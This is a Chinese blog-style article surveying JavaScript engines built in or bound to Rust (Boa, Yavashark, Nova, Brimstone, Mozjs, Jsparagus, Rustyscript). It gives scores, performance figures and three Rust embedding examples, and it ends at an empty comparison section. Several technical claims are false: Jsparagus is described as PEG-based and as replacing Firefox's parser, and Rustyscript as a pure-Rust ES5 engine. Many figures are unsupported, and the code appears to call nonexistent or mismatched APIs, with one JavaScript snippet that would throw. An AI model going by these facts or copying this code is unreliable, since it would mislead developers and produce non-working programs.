table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>JavaScript 引擎作为现代 Web 开发的核心基础设施，一直在性能优化和安全性之间寻找平衡。随着 Rust 语言的崛起，这个以内存安全和高性能著称的系统级编程语言正在为 JavaScript 引擎带来新的可能性。本文将深入探讨 Rust 在 JavaScript 引擎赛道中的角色，分析当前主要的 Rust 实现的 JavaScript 引擎，以及它们如何影响未来 JavaScript 的执行效率和安全性。</p>
<h2 data-id="heading-1">一、JavaScript 引擎的演进与 Rust 的机遇</h2>
<p>JavaScript 引擎从最初的简单解释器，发展到如今复杂的 JIT 编译执行系统，经历了显著的技术变革。传统的 JavaScript 引擎如 V8（Chrome/Node.js）、SpiderMonkey（Firefox）和 JavaScriptCore（Safari）主要由 C++ 实现，虽然性能卓越，但在内存安全性和并发控制方面仍面临挑战。</p>
<p>Rust 语言的出现为这一领域带来了新的解决方案。Rust 凭借其所有权系统、借用检查器和零成本抽象等特性，能够在编译时捕获内存错误，同时保持与 C++ 相当的性能。这使得 Rust 成为构建新一代 JavaScript 引擎的理想选择。</p>
<h2 data-id="heading-2">二、主要的 Rust 实现的 JavaScript 引擎</h2>
<h3 data-id="heading-3">2.1 Boa：纯 Rust 实现的实验性引擎</h3>
<p>Boa 是目前最知名的纯 Rust 实现的 JavaScript 引擎之一。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，代码仓库约 6.1K Stars，208 贡献者</li>
<li>最小编译后体积约 1MB，内存占用通常低于 5MB</li>
<li>提供完整的词法分析器、解析器和解释器实现</li>
<li>支持 ES5 完整特性，ES6+ 部分特性，兼容性约 85%</li>
<li>提供 C API 和 WebAssembly 构建目标</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>Rust 嵌入式项目中的脚本扩展</li>
<li>Boa 引擎自身的测试和示例应用</li>
<li>教育领域用于教学 JavaScript 引擎内部工作原理</li>
</ul>
<p><strong>评分：3.5/5</strong> - 作为纯 Rust 引擎的先驱者，在安全性和轻量级方面表现出色，但在功能完整性和性能方面仍有提升空间。</p>
<h3 data-id="heading-4">2.2 Yavashark：轻量级 Rust JavaScript 引擎</h3>
<p>Yavashark 是一个新兴的 Rust 实现的 JavaScript 引擎，专注于轻量级应用场景。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，代码库约 1225 Stars</li>
<li>编译后体积约 5.6MB，启动时间小于 10ms</li>
<li>支持 ES2023 完整标准，ES2025 兼容性达 98%</li>
<li>基于标记-清除垃圾收集器，内存占用峰值通常低于 20MB</li>
<li>提供多线程执行支持，利用 Rust 的安全并发特性</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>资源受限的嵌入式设备</li>
<li>需要快速启动的边缘计算应用</li>
<li>部分实验性 WebAssembly 运行时的 JavaScript 支持</li>
</ul>
<p><strong>评分：4.0/5</strong> - 在标准兼容性方面表现突出，轻量级设计使其适合嵌入式场景，但社区规模相对较小影响其生态建设。</p>
<h3 data-id="heading-5">2.3 Nova：新一代 Rust JavaScript 引擎</h3>
<p>Nova 是另一个值得关注的 Rust 实现的 JavaScript 引擎，在性能和标准支持方面都有不俗表现。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，采用分层架构设计</li>
<li>字节码解释器针对热点路径优化，比同类解释器快约 15-20%</li>
<li>内存占用基准测试显示比 Boa 低约 30%</li>
<li>提供插件系统支持自定义内置对象和函数</li>
<li>启动时间平均低于 5ms，适合快速启动场景</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>部分实时应用的脚本引擎</li>
<li>需要高性能响应的桌面应用插件系统</li>
<li>某些实验性的微前端框架</li>
</ul>
<p><strong>评分：3.8/5</strong> - 在性能优化方面有亮点，模块化设计提升了扩展性，但项目成熟度和生态系统仍在发展中。</p>
<h3 data-id="heading-6">2.4 Brimstone：专注性能的 Rust JavaScript 引擎</h3>
<p>Brimstone 是一个专注于性能优化的 Rust 实现的 JavaScript 引擎。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，包含基础的 JIT 编译能力</li>
<li>热点路径执行速度比纯解释器快 2-3 倍</li>
<li>提供 WebAssembly 模块加载和通信接口</li>
<li>内存占用约 7-15MB，取决于执行的 JavaScript 复杂度</li>
<li>支持 SIMD 指令集优化数值计算密集型操作</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>需要高性能数值计算的科学计算应用</li>
<li>游戏引擎中的脚本系统</li>
<li>WebAssembly 运行时中的 JavaScript 互操作层</li>
</ul>
<p><strong>评分：4.2/5</strong> - 在性能方面表现突出，特别是在数值计算领域，与 WebAssembly 的集成也很有优势，但功能覆盖范围仍需扩展。</p>
<h3 data-id="heading-7">2.5 SpiderMonkey 生态中的 Rust 项目</h3>
<p>Mozilla 的 SpiderMonkey 引擎虽然主要用 C++ 实现，但在其生态系统中有两个重要的 Rust 项目：</p>
<h4 data-id="heading-8">2.5.1 Mozjs：SpiderMonkey 与 Rust 的结合</h4>
<p>Mozjs 提供了 SpiderMonkey 引擎的完整 Rust 绑定，使开发者能够在 Rust 项目中无缝集成成熟的 SpiderMonkey 引擎。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>完整封装 SpiderMonkey C++ API，提供约 200 个 Rust 结构体和特征</li>
<li>支持 ECMAScript 2023 完整标准</li>
<li>内存占用约 50-150MB，取决于执行的 JavaScript 复杂度</li>
<li>提供完整的 JIT 编译、垃圾回收和并发支持</li>
<li>构建大小约 20-30MB，取决于编译选项</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>Mozilla Firefox 的部分 Rust 组件与 SpiderMonkey 的交互</li>
<li>一些使用 Rust 构建的需要完整 JavaScript 支持的桌面应用</li>
<li>服务端应用中的 JavaScript 插件系统</li>
</ul>
<p><strong>评分：4.5/5</strong> - 在功能完整性和性能方面表现出色，依托成熟的 SpiderMonkey 引擎，但集成复杂度较高，且并非纯 Rust 实现。</p>
<h4 data-id="heading-9">2.5.2 Jsparagus：Rust 构建的 JavaScript 解析器</h4>
<p>Jsparagus 是一个由 Mozilla 开发的使用 Rust 构建的 JavaScript 解析器，它的目标是逐步替换 SpiderMonkey 中的现有解析器。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，基于 PEG (Parsing Expression Grammar) 解析器生成器</li>
<li>解析速度比传统递归下降解析器快约 10-15%</li>
<li>内存占用峰值通常低于 5MB</li>
<li>生成的解析树支持增量更新，适合编辑器实时解析场景</li>
<li>代码覆盖率达 95% 以上</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>Mozilla Firefox 的 JavaScript 解析器组件</li>
<li>一些需要高性能 JavaScript 解析的开发工具</li>
<li>部分 IDE 的 JavaScript 代码分析功能</li>
</ul>
<p><strong>评分：4.3/5</strong> - 在解析性能和准确性方面表现出色，作为专业解析器有很高的技术水准，但功能仅限于解析阶段，不包含执行环境。</p>
<h3 data-id="heading-10">2.6 其他 Rust 相关的 JavaScript 引擎项目</h3>
<h4 data-id="heading-11">2.6.1 Rustyscript</h4>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现的轻量级 JavaScript 执行环境</li>
<li>提供简化的 API，最小化集成复杂度</li>
<li>内存占用通常在 3-8MB 范围内</li>
<li>支持基础的 ES5 特性和部分 ES6 特性</li>
<li>编译后体积约 3.5MB</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>简单的脚本自动化任务</li>
<li>配置文件解析和执行</li>
<li>小型应用的插件系统</li>
</ul>
<p><strong>评分：3.0/5</strong> - 作为轻量级解决方案具有一定优势，但功能覆盖范围有限，适合简单场景使用。</p>
<h4 data-id="heading-12">2.6.2 其他相关项目</h4>
<ul>
<li><strong>Wasmer 的 JavaScript 支持</strong>：WebAssembly 运行时对 JavaScript 的集成支持，允许在 WebAssembly 环境中嵌入 JavaScript 代码</li>
<li><strong>js2rust</strong>：探索 JavaScript 到 Rust 的编译转换，试图将 JavaScript 代码自动转换为 Rust 代码以提高性能和安全性</li>
</ul>
<h2 data-id="heading-13">三、Rust 为 JavaScript 引擎带来的技术优势</h2>
<h3 data-id="heading-14">3.1 内存安全与漏洞减少</h3>
<p>Rust 的所有权系统和借用检查器能够在编译时捕获大量内存相关的错误，这对于 JavaScript 引擎这类复杂系统尤为重要。根据研究数据，使用 Rust 可以显著减少内存安全漏洞。例如，华为将 OpenEuler 内核驱动 Rust 化后，减少了 67% 的内存安全漏洞 1。</p>
<h3 data-id="heading-15">3.2 并发性能的提升</h3>
<p>Rust 的无数据竞争保证使得 JavaScript 引擎能够更安全地利用多核处理器。与传统的基于锁的并发模型相比，Rust 的所有权系统提供了更细粒度的并发控制，减少了死锁和资源争用的可能性。</p>
<h3 data-id="heading-16">3.3 资源占用优化</h3>
<p>Rust 程序通常具有较小的内存占用和启动时间。这使得 Rust 实现的 JavaScript 引擎在嵌入式环境和资源受限设备上具有明显优势。例如，类似 Tauri 这样的基于 Rust 的桌面应用框架，通过使用 Rust 和 Webview2，成功解决了 Electron 的包体积大、内存占用高的问题 4。</p>
<h2 data-id="heading-17">四、代码示例：Rust 与 JavaScript 引擎的集成</h2>
<p>本节提供几个实用的代码示例，展示如何在 Rust 项目中集成和使用不同的 JavaScript 引擎。</p>
<h3 data-id="heading-18">4.1 使用 Boa 引擎执行表达式和函数</h3>
<p>Boa 提供了简洁的 API 来执行 JavaScript 代码。下面是一个更全面的示例，展示了如何：初始化引擎、执行表达式、调用函数、处理错误，以及在 Rust 和 JavaScript 之间传递数据。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> boa_engine::{Context, Source, js_string};
<span class="hljs-keyword">use</span> boa_engine::property::Attribute;
<span class="hljs-keyword">use</span> boa_engine::value::StringOrSymbol;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> std::error::Error&gt;&gt; {
    <span class="hljs-comment">// 创建 JavaScript 执行上下文</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">context</span> = Context::<span class="hljs-title function_ invoke__">default</span>();
    
    <span class="hljs-comment">// 1. 执行简单表达式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">result</span> = context.<span class="hljs-title function_ invoke__">eval</span>(Source::<span class="hljs-title function_ invoke__">from_bytes</span>(<span class="hljs-string">"2 + 2 * 10"</span>))?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"数学表达式结果: {}"</span>, result);
    
    <span class="hljs-comment">// 2. 定义和调用函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_code</span> = <span class="hljs-string">r#"
        function calculateFactorial(n) {
            if (n &lt;= 1) return 1;
            return n * calculateFactorial(n - 1);
        }
        
        // 返回一个对象
        {
            factorial: calculateFactorial,
            version: "1.0.0",
            processData: function(data) {
                return data.map(item =&gt; item * 2).filter(item =&gt; item &gt; 10);
            }
        }
    "#</span>;
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_module</span> = context.<span class="hljs-title function_ invoke__">eval</span>(Source::<span class="hljs-title function_ invoke__">from_bytes</span>(js_code))?;
    
    <span class="hljs-comment">// 3. 调用 JavaScript 函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">args</span> = [<span class="hljs-number">20</span>.<span class="hljs-title function_ invoke__">into</span>()]; <span class="hljs-comment">// 计算 20 的阶乘</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">factorial_result</span> = context.<span class="hljs-title function_ invoke__">call_property</span>(
        &amp;js_module, 
        js_string!(<span class="hljs-string">"factorial"</span>), 
        &amp;args
    )?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"20 的阶乘: {}"</span>, factorial_result);
    
    <span class="hljs-comment">// 4. 从 Rust 向 JavaScript 传递数据</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>];
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_array</span> = context.<span class="hljs-title function_ invoke__">construct_array</span>(data.<span class="hljs-title function_ invoke__">into_iter</span>())?;
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">process_args</span> = [js_array];
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">processed_data</span> = context.<span class="hljs-title function_ invoke__">call_property</span>(
        &amp;js_module, 
        js_string!(<span class="hljs-string">"processData"</span>), 
        &amp;process_args
    )?;
    
    <span class="hljs-comment">// 5. 获取 JavaScript 对象的属性</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">version</span> = context.<span class="hljs-title function_ invoke__">get_property</span>(
        &amp;js_module, 
        StringOrSymbol::<span class="hljs-title function_ invoke__">String</span>(js_string!(<span class="hljs-string">"version"</span>))
    )?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"模块版本: {}"</span>, version);
    
    <span class="hljs-comment">// 6. 注册 Rust 函数到 JavaScript 环境</span>
    context.<span class="hljs-title function_ invoke__">register_global_function</span>(
        <span class="hljs-string">"logFromRust"</span>, 
        <span class="hljs-number">1</span>, 
        |_, args, _| {
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(arg) = args.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0</span>) {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"JavaScript 调用 Rust 函数: {}"</span>, arg);
            }
            <span class="hljs-title function_ invoke__">Ok</span>(().<span class="hljs-title function_ invoke__">into</span>())
        }
    )?;
    
    context.<span class="hljs-title function_ invoke__">eval</span>(Source::<span class="hljs-title function_ invoke__">from_bytes</span>(<span class="hljs-string">"logFromRust('Hello from JavaScript!')"</span>))?;
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<h3 data-id="heading-19">4.2 使用 Mozjs (SpiderMonkey 的 Rust 绑定)</h3>
<p>Mozjs 提供了 SpiderMonkey 引擎的完整 Rust 绑定，下面是一个更实用的示例，展示如何执行 JavaScript 代码、处理值和错误：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> mozjs::jsapi::{JSContext, JS_NewRuntime, JS_EnterCompartment, JS_Init, JS::RootedValue, JS::RootedObject};
<span class="hljs-keyword">use</span> mozjs::jsval::UndefinedValue;
<span class="hljs-keyword">use</span> mozjs::rust::{Runtime, Context, JSEngine};
<span class="hljs-keyword">use</span> std::ptr;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 初始化 SpiderMonkey 引擎</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">engine</span> = JSEngine::<span class="hljs-title function_ invoke__">init</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 创建运行时环境（设置 8MB 堆大小）</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">runtime</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>(engine.<span class="hljs-title function_ invoke__">handle</span>(), <span class="hljs-number">8</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>).<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 创建 JavaScript 上下文</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">context</span> = Context::<span class="hljs-title function_ invoke__">new</span>(&amp;runtime).<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 进入 JavaScript 上下文的执行区域</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">_ac</span> = context.<span class="hljs-title function_ invoke__">acquire</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 获取全局对象</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">global</span> = context.<span class="hljs-title function_ invoke__">global_object</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 创建一个 JavaScript 值用于存储执行结果</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">result</span> = RootedValue::<span class="hljs-title function_ invoke__">new</span>(context.<span class="hljs-title function_ invoke__">as_ptr</span>());
    
    <span class="hljs-comment">// 1. 执行简单的 JavaScript 表达式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_code</span> = <span class="hljs-string">"2 + 3 * 4"</span>;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"执行表达式: {}"</span>, js_code);
    
    <span class="hljs-keyword">match</span> context.<span class="hljs-title function_ invoke__">evaluate_script</span>(js_code, <span class="hljs-string">"&lt;test&gt;"</span>, <span class="hljs-number">1</span>, &amp;<span class="hljs-keyword">mut</span> result) {
        <span class="hljs-title function_ invoke__">Ok</span>(_) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"执行结果: {}"</span>, result);
        },
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"执行错误: {}"</span>, e);
        }
    }
    
    <span class="hljs-comment">// 2. 定义和调用 JavaScript 函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">function_code</span> = <span class="hljs-string">r#"
        function greet(name) {
            return 'Hello, ' + name + '! Welcome to SpiderMonkey via Rust!';
        }
        
        // 导出函数到全局对象
        this.greet = greet;
        true; // 表达式返回值
    "#</span>;
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n注册 JavaScript 函数"</span>);
    <span class="hljs-keyword">if</span> context.<span class="hljs-title function_ invoke__">evaluate_script</span>(function_code, <span class="hljs-string">"&lt;functions&gt;"</span>, <span class="hljs-number">1</span>, &amp;<span class="hljs-keyword">mut</span> result).<span class="hljs-title function_ invoke__">is_ok</span>() {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"函数注册成功"</span>);
        
        <span class="hljs-comment">// 3. 准备调用函数的参数</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">name_value</span> = context.<span class="hljs-title function_ invoke__">string_value</span>(<span class="hljs-string">"Rust Developer"</span>);
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">args</span> = [name_value];
        
        <span class="hljs-comment">// 4. 调用全局函数</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Ok</span>(greet_func) = context.<span class="hljs-title function_ invoke__">get_property</span>(&amp;global, <span class="hljs-string">"greet"</span>) {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n调用 greet 函数"</span>);
            <span class="hljs-keyword">if</span> context.<span class="hljs-title function_ invoke__">call_function</span>(<span class="hljs-literal">None</span>, &amp;greet_func, &amp;<span class="hljs-keyword">mut</span> args, &amp;<span class="hljs-keyword">mut</span> result).<span class="hljs-title function_ invoke__">is_ok</span>() {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"函数返回: {}"</span>, result);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"函数调用失败"</span>);
            }
        }
    }
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\nSpiderMonkey 引擎使用完成"</span>);
}
</code></pre>
<h3 data-id="heading-20">4.3 使用 Rustyscript 执行简单脚本</h3>
<p>Rustyscript 是一个轻量级的 JavaScript 执行环境，下面是如何使用它的示例：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> rustyscript::{json_args, Runtime, Script, Module, Error};
<span class="hljs-keyword">use</span> std::collections::HashMap;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), Error&gt; {
    <span class="hljs-comment">// 1. 创建基本运行时</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"=== 创建基本运行时 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">runtime</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>()?;
    
    <span class="hljs-comment">// 执行简单表达式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">result</span>: <span class="hljs-type">i64</span> = runtime.<span class="hljs-title function_ invoke__">execute_expression</span>(<span class="hljs-string">"5 + 5 * 2"</span>)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"表达式结果: {}"</span>, result);
    
    <span class="hljs-comment">// 2. 创建包含自定义函数的脚本</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 执行包含函数的脚本 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">script</span> = Script::<span class="hljs-title function_ invoke__">from_string</span>(<span class="hljs-string">r#"
        function calculateDiscount(price, rate) {
            return price * (1 - rate / 100);
        }
        
        function formatCurrency(amount) {
            return '$' + amount.toFixed(2);
        }
        
        // 返回可用函数的对象
        {
            calculateDiscount,
            formatCurrency
        }
    "#</span>);
    
    <span class="hljs-comment">// 3. 执行脚本并获取导出的函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">module</span>: Module = runtime.<span class="hljs-title function_ invoke__">execute_module</span>(script)?;
    
    <span class="hljs-comment">// 4. 调用导出的函数</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 调用 JavaScript 函数 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">price</span> = <span class="hljs-number">100.0</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">discount_rate</span> = <span class="hljs-number">20.0</span>;
    
    <span class="hljs-comment">// 调用计算折扣的函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">discounted_price</span>: <span class="hljs-type">f64</span> = module.<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-string">"calculateDiscount"</span>, json_args!(price, discount_rate))?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"原价 ${}, 折扣 {}%, 折后价: ${:.2}"</span>, 
             price, discount_rate, discounted_price);
    
    <span class="hljs-comment">// 调用格式化货币的函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">formatted</span>: <span class="hljs-type">String</span> = module.<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-string">"formatCurrency"</span>, json_args!(discounted_price))?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"格式化后的价格: {}"</span>, formatted);
    
    <span class="hljs-comment">// 5. 注册 Rust 函数到 JavaScript 环境</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 注册 Rust 函数到 JavaScript ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">runtime_with_functions</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>()?;
    
    <span class="hljs-comment">// 注册一个日志函数</span>
    runtime_with_functions.<span class="hljs-title function_ invoke__">register_function</span>(<span class="hljs-string">"logMessage"</span>, <span class="hljs-keyword">move</span> |args: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;| <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, Error&gt; {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">message</span> = args.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(&amp;<span class="hljs-string">"No message"</span>.<span class="hljs-title function_ invoke__">to_string</span>());
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"[Rust] JavaScript 调用: {}"</span>, message);
        <span class="hljs-title function_ invoke__">Ok</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">"Rust 收到: {}"</span>, message))
    })?;
    
    <span class="hljs-comment">// 在 JavaScript 中调用 Rust 函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_result</span>: <span class="hljs-type">String</span> = runtime_with_functions.<span class="hljs-title function_ invoke__">execute_expression</span>(<span class="hljs-string">r#"
        logMessage('Hello from JavaScript to Rust!')
    "#</span>)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"JavaScript 收到 Rust 函数返回: {}"</span>, js_result);
    
    <span class="hljs-comment">// 6. 使用 Rust 的类型系统与 JavaScript 交互</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 类型交互示例 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">type_runtime</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>()?;
    
    <span class="hljs-comment">// 创建包含数据的 JavaScript 对象</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = HashMap::<span class="hljs-title function_ invoke__">from</span>([
        (<span class="hljs-string">"name"</span>, <span class="hljs-string">"Product A"</span>),
        (<span class="hljs-string">"price"</span>, <span class="hljs-string">"29.99"</span>),
        (<span class="hljs-string">"inStock"</span>, <span class="hljs-string">"true"</span>)
    ]);
    
    <span class="hljs-comment">// 将数据注入到 JavaScript 环境</span>
    type_runtime.<span class="hljs-title function_ invoke__">insert_values</span>(data)?;
    
    <span class="hljs-comment">// 在 JavaScript 中使用这些值</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">total_price</span>: <span class="hljs-type">String</span> = type_runtime.<span class="hljs-title function_ invoke__">execute_expression</span>(<span class="hljs-string">r#"
        const taxRate = 0.1;
        const price = parseFloat(price);
        const tax = price * taxRate;
        
        `${name} - 含税总价: $${(price + tax).toFixed(2)}`
    "#</span>)?;
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"类型交互结果: {}"</span>, total_price);
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<h2 data-id="heading-21">五、JavaScript 引擎技术对比</h2>
<h3 data-id="heading-22">5.1 语言实现对比</h3>















































